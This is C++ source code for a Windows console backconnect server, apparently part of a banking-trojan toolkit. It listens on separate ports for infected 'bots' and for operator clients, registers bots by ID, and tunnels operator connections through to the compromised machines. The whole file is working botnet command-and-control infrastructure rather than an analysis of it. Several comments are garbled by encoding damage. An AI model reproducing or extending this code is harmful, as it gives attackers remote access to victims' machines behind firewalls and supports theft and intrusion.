#include <windows.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "language.h"
#include "core.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\wsocket.h"
#include "..\common\crypt.h"
#include "..\common\console.h"
#include "..\common\threadsgroup.h"
#include "..\common\backconnect.h"
#include "..\common\cui.h"

//Maximum waiting time connection service bot on a local port in millesekundah.
#define BCWAIT_TIMEOUT (10 * 60000)

typedef struct
{
  SOCKET list[4]; //Sockets in order ipv4 bot, ipv4 client, ipv6 bot, ipv6 client.
  BYTE count;    //Real kolichetsvo an open, ports.
}GENSOCKDATA;

static HANDLE eventQuit;

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Working with Handel's table.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

typedef struct
{
  SOCKET client;         //Client socket.
  SOCKET bot;            //Socket bot.
  HANDLE connectedEvent; //Signal for connecting sBot.
  DWORD id;              //ID of the element.
}BCCCONNECT;

static DWORD nextBccId;
static BCCCONNECT *bccList;
static DWORD bccListCount;
static CRITICAL_SECTION csBccConnect;

/*
  �������� �������� ��� ��������� ������ ����������.
*/
static void initBccConnect(void)
{
  nextBccId    = Crypt::mtRand();
  bccListCount = 0;
  bccList      = NULL;
  CWA(kernel32, InitializeCriticalSection)(&csBccConnect);
}

/*
  ������������ �������� ��� ��������� ������ ����������.
*/
static void uninitBccConnect(void)
{
  CWA(kernel32, DeleteCriticalSection)(&csBccConnect);
}

/*
  ����� ������ ����������.

  IN id - ID ����������.

  Return - ������ ����������, ��� NULL - ���� ��� �� �������.
*/
static BCCCONNECT *getBccConnect(DWORD id)
{
  if(id != 0)for(register DWORD i = 0; i < bccListCount; i++)if(bccList[i].id == id)return &bccList[i];
  return NULL; 
}

/*
  ���������� ������ ���������� � ������.

  IN client - ����� ��� ����������.

  Return    - ID ����������, ��� 0 - � ������ ������.
*/
static DWORD addBccConnect(SOCKET client)
{
  CWA(kernel32, EnterCriticalSection)(&csBccConnect);
  
  BCCCONNECT *newConnect = NULL;

  //Cut the useless ending.
  while(bccListCount > 0 && bccList[bccListCount - 1].id == 0)bccListCount--;
  
  for(DWORD i = 0; i < bccListCount; i++)if(bccList[i].id == 0)
  {
    newConnect = &bccList[i];
    break;
  }

  if(newConnect == NULL)
  {
    if(!Mem::reallocEx(&bccList, sizeof(BCCCONNECT) * (bccListCount + 1)))
    {
      CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
      return 0;
    }
    
    newConnect = &bccList[bccListCount];
    bccListCount++;
  }

  DWORD id = 0;

  newConnect->client = client;
  newConnect->bot    = INVALID_SOCKET;
  newConnect->connectedEvent = CWA(kernel32, CreateEventW)(NULL, TRUE, FALSE, NULL);
  newConnect->id = 0;
  
  if(newConnect->connectedEvent != NULL)
  {
    if(++nextBccId == 0)nextBccId++;
    id = newConnect->id = nextBccId;
  }

  CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  return id;
}

/*
  �������� ���������� � ������������ ���� ��������.

  IN id - ID ����������.
*/
static void closeBccConnect(DWORD id)
{
  if(id != 0)
  {
    CWA(kernel32, EnterCriticalSection)(&csBccConnect);
    
    BCCCONNECT *bccConnect = NULL;
    DWORD i = 0;
    for(; i < bccListCount; i++)if(bccList[i].id == id)bccConnect = &bccList[i];
    
    if(bccConnect != NULL)
    {
      //see freeBccConnect ().
      WSocket::tcpClose(bccConnect->client);
      WSocket::tcpClose(bccConnect->bot);
      CWA(kernel32, CloseHandle)(bccConnect->connectedEvent);
      
      bccConnect->client         = INVALID_SOCKET;
      bccConnect->bot            = INVALID_SOCKET;
      bccConnect->connectedEvent = NULL;
      bccConnect->id             = 0;
      
      //Cut end.
      if(i + 1 == bccListCount)
      {
        if(--bccListCount == 0)
        {
          Mem::free(bccList);
          bccList = NULL;
        }
        else Mem::reallocEx(&bccList, sizeof(DWORD) * bccListCount);
      }
    }
    
    CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  }
}

/*
  ������ ����� �������� � �����

  IN p   - DWORD, ID ����������.

  Return - 0.
*/
static DWORD WINAPI sockTunnel(void *p)
{
  DWORD id = (DWORD_PTR)p;
  
  HANDLE events[2];
  
  //Receive events.
  CWA(kernel32, EnterCriticalSection)(&csBccConnect);
  BCCCONNECT *bccConnect = getBccConnect(id);
  if(bccConnect != NULL)
  {
    events[0] = bccConnect->connectedEvent;
    events[1] = eventQuit;
  }
  CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
  
  //We are waiting for events.
  if(bccConnect != NULL)
  {
    DWORD r = CWA(kernel32, WaitForMultipleObjects)(2, events, FALSE, BCWAIT_TIMEOUT);

    if(r == WAIT_OBJECT_0)
    {
      SOCKET s1, s2;

      CWA(kernel32, EnterCriticalSection)(&csBccConnect);
      BCCCONNECT *bccConnect = getBccConnect(id);
      if(bccConnect != NULL)
      {
        s1 = bccConnect->bot;
        s2 = bccConnect->client;
      }
      CWA(kernel32, LeaveCriticalSection)(&csBccConnect);

      if(bccConnect != NULL)
      {
        Console::writeFormatW(lng_listen_tunnel, id);
        WSocket::tcpTunnelAndWaitForWinEvent(s1, s2, eventQuit);
      }
      //else / / In fact, this does not really get what I think.
    }
    else if(r == WAIT_TIMEOUT)Console::writeFormatW(lng_listen_id_timeout, id);

    closeBccConnect(id);
  }

  return 0;
}

/*
  ����� ���������� �� �������� � �����.

  IN gsd - ������ �������.
*/
static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
{
  SOCKADDR_STORAGE sa;
  WCHAR ipStr[MAX_PATH];                 //The textual representation of IP.
  SOCKET botMainSocket = INVALID_SOCKET; //Control connection.
  ThreadsGroup::GROUP group;
  
  ThreadsGroup::_createGroup(&group);

  for(;;)
  {
    //FIXME: WSAEventSelect ().
    SOCKET curSocket = WSocket::tcpWaitForEvent(gsd->list, gsd->count, 1000, NULL, 0);

    //Error.
    if(curSocket == INVALID_SOCKET && CWA(ws2_32, WSAGetLastError)() != WSAETIMEDOUT)break;
    
    //Checking messages while on the output.
    if(CWA(kernel32, WaitForSingleObject)(eventQuit, 0) != WAIT_TIMEOUT)break;
    
    //Timeout.
    if(curSocket == INVALID_SOCKET)continue;

    //Obtain the data connection.
    int saSize = sizeof(SOCKADDR_STORAGE);
    SOCKET acceptedSocket = CWA(ws2_32, accept)(curSocket, (sockaddr *)&sa, &saSize);
    if(acceptedSocket != INVALID_SOCKET)
    {
      WSocket::tcpDisableDelay(acceptedSocket, true);
      WSocket::tcpSetKeepAlive(acceptedSocket, true, Backconnect::KEEPALIVE_DELAY, Backconnect::KEEPALIVE_INTERVAL);
      WSocket::ipToStringW(&sa, ipStr);
    }
    
    //Sockets for the bot.
    for(BYTE i = 0; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
    {
      if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_error_accept_bot, sizeof(lng_listen_error_accept_bot) / sizeof(WCHAR) - 1);
      else
      {
        //Obtain the team.
        Backconnect::COMMAND command;
        LPSTR commandData = NULL;

        if(!Backconnect::_readCommand(acceptedSocket, &command, (LPBYTE *)&commandData))
        {
          Console::writeStringW(lng_listen_error_accept_bot, sizeof(lng_listen_error_accept_bot) / sizeof(WCHAR) - 1);
          WSocket::tcpClose(acceptedSocket);
          goto NEXT;
        }
        
        //This is a basic compound. Close existing ones.
        if(command.command == Backconnect::COMMAND_BOTID)
        {
          WSocket::tcpClose(botMainSocket);
          botMainSocket = acceptedSocket;
          
          {
            LPWSTR botId = Str::_utf8ToUnicode(commandData, -1);
            Console::writeFormatW(lng_listen_accept_bot, botId ? botId : L"-", ipStr);
            Mem::free(botId);
          }
        }
        //This service connection.
        else if(command.command == Backconnect::COMMAND_IS_SERVICE && command.dataSize == sizeof(DWORD))
        {
          CWA(kernel32, EnterCriticalSection)(&csBccConnect);
          BCCCONNECT *bccConnect = getBccConnect(*(LPDWORD)commandData);
          if(bccConnect == NULL)
          {
            WSocket::tcpClose(acceptedSocket);
            Console::writeFormatW(lng_listen_error_accept_bot_unknown_id, *(LPDWORD)commandData);
          }
          else
          {
            bccConnect->bot = acceptedSocket;
            CWA(kernel32, SetEvent)(bccConnect->connectedEvent);
          }
          CWA(kernel32, LeaveCriticalSection)(&csBccConnect);
        }
        else
        {
          WSocket::tcpClose(acceptedSocket);
          Console::writeFormatW(lng_listen_error_accept_bot_unknown_command, command.command);
        }
        Mem::free(commandData);
      }
      goto NEXT;
    }
    
    //Sockets for the client.
    for(BYTE i = 1; i < gsd->count; i += 2)if(curSocket == gsd->list[i])
    {
      if(acceptedSocket == INVALID_SOCKET)Console::writeStringW(lng_listen_faccept_client, sizeof(lng_listen_faccept_client) / sizeof(WCHAR) - 1);
      //If the bot have not yet connected, disable the client.
      else if(botMainSocket == INVALID_SOCKET)Console::writeFormatW(lng_listen_accept_bclient, ipStr);
      else
      {
        //Save the client socket.
        DWORD id = addBccConnect(acceptedSocket);
        Console::writeFormatW(lng_listen_accept_client, ipStr, id);
        if(id > 0 && Backconnect::_writeCommand(botMainSocket, Backconnect::COMMAND_CONNECT, (LPBYTE)&id, sizeof(DWORD)))
        {
          if(!ThreadsGroup::_createThread(&group, 0, sockTunnel, (LPVOID)(DWORD_PTR)id, NULL, NULL))
          {
            Console::writeFormatW(lng_error_thread_failed, CWA(kernel32, GetLastError)());
            closeBccConnect(id);//Inside is already WSocket:: tcpClose (acceptedSocket)
          }
          ThreadsGroup::_closeTerminatedHandles(&group);
          goto NEXT;
        }
        else
        {
          Console::writeFormatW(lng_listen_error_socket, CWA(ws2_32, WSAGetLastError)());
          
          //Error on control socket.
          if(id > 0)
          {
            WSocket::tcpClose(botMainSocket);
            botMainSocket = INVALID_SOCKET;
          }
        }
      }
      WSocket::tcpClose(acceptedSocket);
      goto NEXT;
    }

NEXT:;
  }
  
  Console::writeStringW(lng_listen_shutdown, sizeof(lng_listen_shutdown) / sizeof(WCHAR) - 1);
  
  WSocket::tcpClose(botMainSocket);  
  
  //Closure of the service wires.
  ThreadsGroup::_waitForAllExit(&group, INFINITE);
  ThreadsGroup::_closeGroup(&group);
}

/*
  ������ �������, ��� ��������� ��������.

  Return - TRUE.
*/
static BOOL WINAPI handlerRoutine(DWORD)
{
  CWA(kernel32, SetEvent)(eventQuit);
  return TRUE;
}

/*
  �������� �������� �� IPv4.

  IN port - ����.

  Return  - ����� ������, ��� INVALID_SOCKET.
*/
static SOCKET listenPortIpv4(WORD port)
{
  SOCKADDR_IN si;
  Mem::_zero(&si, sizeof(SOCKADDR_IN));
  si.sin_family = AF_INET;
  si.sin_port   = SWAP_WORD(port);
  SOCKET s = WSocket::tcpListen((SOCKADDR_STORAGE *)&si, SOMAXCONN);
  Console::writeFormatW(s == INVALID_SOCKET ? lng_error_failed_port_ipv4 : lng_listen_port_ipv4, port);
  return s;
}

/*
  �������� �������� �� IPv6.

  IN port - ����.

  Return  - ����� ������, ��� INVALID_SOCKET.
*/
static SOCKET listenPortIpv6(WORD port)
{
  SOCKADDR_IN6 si;
  Mem::_zero(&si, sizeof(SOCKADDR_IN6));
  si.sin6_family = AF_INET6;
  si.sin6_port   = SWAP_WORD(port);
  SOCKET s = WSocket::tcpListen((SOCKADDR_STORAGE *)&si, SOMAXCONN);
  Console::writeFormatW(s == INVALID_SOCKET ? lng_error_failed_port_ipv6 : lng_listen_port_ipv6, port);
  return s;
}

/*
  ����� �����.
*/
void commandListen(LPWSTR *switches, DWORD switchesCount)
{  
  DWORD botPort, clientPort;

  //Getting the ports from the command line.
  {
    LPWSTR botPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_botport);
    LPWSTR clientPortAsString = Cui::_getSwitchValue(switches, switchesCount, lng_switch_clientport);

    if(botPortAsString <= (LPWSTR)1 || clientPortAsString <= (LPWSTR)1)
    {
      Console::writeStringW(lng_listen_no_ports, sizeof(lng_listen_no_ports) / sizeof(WCHAR) - 1);
      return;
    }
    
    botPort = Str::_ToInt32W(botPortAsString, NULL);
    clientPort = Str::_ToInt32W(clientPortAsString, NULL);
    if(botPort < 1 || botPort >= MAXWORD || clientPort < 1 || clientPort >= MAXWORD)
    {
      Console::writeStringW(lng_listen_no_ports, sizeof(lng_listen_no_ports) / sizeof(WCHAR) - 1);
      return;
    }
  }

  if(!WSocket::init())
  {
    Console::writeStringW(lng_error_wsocket_failed, sizeof(lng_error_wsocket_failed) / sizeof(WCHAR) - 1);
    coreData.exitCode = Cui::EXITCODE_ERROR_SOCKET; 
    return;
  }
  
  bool ipv4 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv4) == (LPWSTR)1);
  bool ipv6 = (Cui::_getSwitchValue(switches, switchesCount, lng_switch_ipv6) == (LPWSTR)1);

  /*    
    Specifying the default protocol.
    
    In the distant future, when the basic protocol would ipv6, needs to be replaced this line
    respectively.
  */
  if(!ipv4 && !ipv6)ipv4 = true;
  
  //Create a socket.
  GENSOCKDATA gsd;
  Mem::_zero(&gsd, sizeof(GENSOCKDATA));

  if(ipv4)
  {
    gsd.list[gsd.count + 0] = listenPortIpv4((WORD)botPort);
    gsd.list[gsd.count + 1] = listenPortIpv4((WORD)clientPort);

    gsd.count += 2;
  }
  
  if(ipv6)
  {
    gsd.list[gsd.count + 0] = listenPortIpv6((WORD)botPort);
    gsd.list[gsd.count + 1] = listenPortIpv6((WORD)clientPort);

    gsd.count += 2;
  }

  //Checking whether successfully created all the sockets.
  for(BYTE i = 0; i < gsd.count; i++)if(gsd.list[i] == INVALID_SOCKET)
  {
    coreData.exitCode = Cui::EXITCODE_ERROR_SOCKET;
    goto END;
  }
  
  if((eventQuit = CWA(kernel32, CreateEventW)(NULL, TRUE, FALSE, NULL)) == NULL ||
     !CWA(kernel32, SetConsoleCtrlHandler)(NULL, FALSE) || !CWA(kernel32, SetConsoleCtrlHandler)(handlerRoutine, TRUE)
    )
  {
    Console::writeStringW(lng_error_unknown, sizeof(lng_error_unknown) / sizeof(WCHAR) - 1);
    coreData.exitCode = Cui::EXITCODE_ERROR_UNKNOWN;
  }
  else
  {
    Console::writeFormatW(lng_listen_wait_incoming, botPort, clientPort);
    initBccConnect();
    acceptGeneralConnections(&gsd);
    uninitBccConnect();
    coreData.exitCode = Cui::EXITCODE_SUCCESSED;  
  }
  if(eventQuit != NULL)CWA(kernel32, CloseHandle)(eventQuit);

END:
  for(BYTE i = 0; i < gsd.count; i++)WSocket::tcpClose(gsd.list[i]);
  if(coreData.exitCode == Cui::EXITCODE_SUCCESSED)Console::writeStringW(lng_listen_ready, sizeof(lng_listen_ready) / sizeof(WCHAR) - 1);
  WSocket::uninit();
}
